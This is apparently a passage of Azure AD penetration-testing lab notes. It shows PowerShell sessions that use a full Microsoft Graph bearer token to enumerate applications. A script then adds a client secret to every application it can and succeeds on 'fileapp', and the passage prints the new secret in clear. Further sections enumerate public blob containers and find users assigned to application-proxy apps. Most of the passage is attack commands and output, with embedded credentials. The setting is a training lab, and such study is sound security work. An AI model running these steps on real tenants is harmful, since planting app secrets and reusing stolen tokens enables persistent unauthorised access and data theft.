PS C:\AzAD\Tools> $Token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6InlSdGhUVVFwZmdLRGpXZUotRDBWWGJZX3JJRGpFUVBPdVJMZmZHQWtWS28iLCJhbGciOiJSUzI1NiIsIng1dCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyIsImtpZCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY1MzA1NDEzOSwibmJmIjoxNjUzMDU0MTM5LCJleHAiOjE2NTMxNDA4MzksImFpbyI6IkUyWmdZRGl5dmRxd3AvVEFyTk1tWVNjL2Z6QitEZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z01BQUFBQUFBQUF3QUFBQUFBQUFBQndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiNEJ3VHN1Unl6MC1NWlY4TlNCTkJBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.F-KZhqeaGkyITAHIE49xTe1rCNbQswLYtnkfKr87gPSbAwNhXtRFK_rJNNMCpgYERFW5JHRXaeaZnOqMxDGaerygfR7u8sHq-Z48LONym_6_KYQ4EuiXMvc1Fsr8vpbEy61ofOAuGRNx-yYxMU4c8DL6mPNxzvXAkN7j5OJfoIfl4TAk53GpjqJkQnTS1xXq6g_Fc0vz0X6tfDOuZtVwqIux9FTncVPzXPt0uivCQ0MNwXQIRQG0ONsVrhGl5PVx7zQcQIAhs5TKvUsg3f1ZHRpXiTSYAUg2xhnj40BhBzADpC-ZKXgfRAx9uQA0-yv9CyY8dFtapNwUf5BIB3Gy4g'

PS C:\AzAD\Tools> $URI = 'https://graph.microsoft.com/v1.0/applications'
PS C:\AzAD\Tools> $RequestParams = @{
>> Method = 'GET'
>> Uri = $URI
>> Headers = @{
>> 'Authorization' = "Bearer $Token"
>> }
>> }
PS C:\AzAD\Tools> (Invoke-RestMethod @RequestParams).value


id                         : 0dc81699-eff8-4386-a50c-c44e98b3db56
deletedDateTime            :
appId                      : e646b73d-d9b9-4e7f-980d-e4deefb8bc00
applicationTemplateId      :
disabledByMicrosoftStatus  :
createdDateTime            : 2022-05-12T18:56:12Z
displayName                : student59
description                :
groupMembershipClaims      :
identifierUris             : {}
isDeviceOnlyAuthSupported  :
isFallbackPublicClient     :

...

optionalClaims             :
addIns                     : {}
api                        : @{acceptMappedClaims=; knownClientApplications=System.Object[]; requestedAccessTokenVersion=; oauth2PermissionScopes=System.Object[];
                             preAuthorizedApplications=System.Object[]}
appRoles                   : {}
info                       : @{logoUrl=; marketingUrl=; privacyStatementUrl=; supportUrl=; termsOfServiceUrl=}
keyCredentials             : {}
parentalControlSettings    : @{countriesBlockedForMinors=System.Object[]; legalAgeGroupRule=Allow}
passwordCredentials        : {}
publicClient               : @{redirectUris=System.Object[]}
requiredResourceAccess     : {}
verifiedPublisher          : @{displayName=; verifiedPublisherId=; addedDateTime=}
web                        : @{homePageUrl=; logoutUrl=; redirectUris=System.Object[]; implicitGrantSettings=}
spa                        : @{redirectUris=System.Object[]}
```

### Check if the service principal for the managed identity can add credentials to another enterprise application
```powershell
PS C:\AzAD\Tools> . C:\AzAD\Tools\Add-AzADAppSecret.ps1
PS C:\AzAD\Tools> Add-AzADAppSecret -GraphToken $graphaccesstoken -Verbose
VERBOSE: GET https://graph.microsoft.com/v1.0/applications with 0-byte payload
VERBOSE: received -1-byte response of content type application/json;odata.metadata=minimal;odata.streaming=true;IEEE754Compatible=false;charset=utf-8
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/0dc81699-eff8-4386-a50c-c44e98b3db56/addPassword with -1-byte payload
Failed to add new client secret to 'student59' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/14115c03-86a9-454c-8dd9-08fef67fc6b3/addPassword with -1-byte payload
Failed to add new client secret to 'student20' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/148472b8-4a0e-40d8-bad0-b72416081233/addPassword with -1-byte payload
Failed to add new client secret to 'IntuneApp' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/35589758-714e-43a9-be9e-94d22fdd34f6/addPassword with -1-byte payload
VERBOSE: received -1-byte response of content type application/json;odata.metadata=minimal;odata.streaming=true;IEEE754Compatible=false;charset=utf-8
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/5210d59c-12a5-4cfe-b6fb-9ac63df6c998/addPassword with -1-byte payload
Failed to add new client secret to 'student51' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/60261d6f-f3c3-4fdc-8097-8440c102a0fb/addPassword with -1-byte payload
Failed to add new client secret to 'student191' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/60ffe217-30ae-4016-b767-c8c71fff8ddc/addPassword with -1-byte payload
Failed to add new client secret to 'Finance Management System' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/69d4bc90-a538-4f9b-bac2-77a91452b072/addPassword with -1-byte payload
Failed to add new client secret to 'student5' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/7a96c6ee-d830-4e07-94a1-01c808070269/addPassword with -1-byte payload
Failed to add new client secret to 'student59-2' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/8230d076-740b-48e3-a622-ffca8f09a480/addPassword with -1-byte payload
Failed to add new client secret to 'student37' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/950480a5-a88e-4c45-8a8c-38a02e4c6232/addPassword with -1-byte payload
Failed to add new client secret to 'AdminAppSimulation' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/9691c7ec-63a5-43e7-9011-b499c4f6dec5/addPassword with -1-byte payload
Failed to add new client secret to 'student64' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/9b21e27e-c54d-419b-b31a-f64615d87e67/addPassword with -1-byte payload
Failed to add new client secret to 'Student196' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/a1333e88-1278-41bf-8145-155a069ebed0/addPassword with -1-byte payload
Failed to add new client secret to 'AdminAppSimulation1' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/acad5192-40fc-4358-98a7-8b2c06193dac/addPassword with -1-byte payload
Failed to add new client secret to 'student20-2' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/d5c231aa-04b0-42e8-9a2a-cf7be3750ccd/addPassword with -1-byte payload
Failed to add new client secret to 'Student48' Application.
VERBOSE: POST https://graph.microsoft.com/v1.0/applications/df5f4951-1cd3-475c-afe4-c0ee8fecde92/addPassword with -1-byte payload
Failed to add new client secret to 'P2P Server' Application.

Client secret added to :


Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp
Key ID    : 569cc1d8-0702-48ab-8c41-0e25ad72e7da
Secret    : HJ.8Q~YOW7O68DkVyKIHuLARreChDD3PzzHhhddP

```

### Enumerate Azure Blobs
```powershell
PS C:\AzAD\Tools> . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
PS C:\AzAD\Tools> Invoke-EnumerateAzureBlobs -Base defcorp
Found Storage Account -  defcorpcodebackup.blob.core.windows.net
Found Storage Account -  defcorpcommon.blob.core.windows.net
Write-Progress : Cannot validate argument on parameter 'PercentComplete'. The 101 argument is greater than the maximum allowed range of 100. Supply an argument that is less than or equal to 100
and then try the command again.
At C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1:104 char:138
+ ... ts based off of permutations on $Base" -PercentComplete $lineprogress
+                                                             ~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Write-Progress], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.WriteProgressCommand


Write-Progress : Cannot validate argument on parameter 'PercentComplete'. The 101 argument is greater than the maximum allowed range of 100. Supply an argument that is less than or equal to 100
and then try the command again.
At C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1:194 char:132
+ ... s for $subDomain Storage Account" -PercentComplete $subfolderprogress
+                                                        ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Write-Progress], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.WriteProgressCommand


Found Container - defcorpcommon.blob.core.windows.net/backup
        Empty Public Container Available: https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list


Write-Progress : Cannot validate argument on parameter 'PercentComplete'. The 101 argument is greater than the maximum allowed range of 100. Supply an argument that is less than or equal to 100
and then try the command again.
At C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1:194 char:132
+ ... s for $subDomain Storage Account" -PercentComplete $subfolderprogress
+                                                        ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Write-Progress], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.WriteProgressCommand


```

### Enumerate applications that have application proxy configured
- Uses the AzureAD PowerShell module
` Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}`

### Get the service prinicipal based on a name
`Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}`

### Find users and groups that are allowed to access the application
```powershell
. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
```
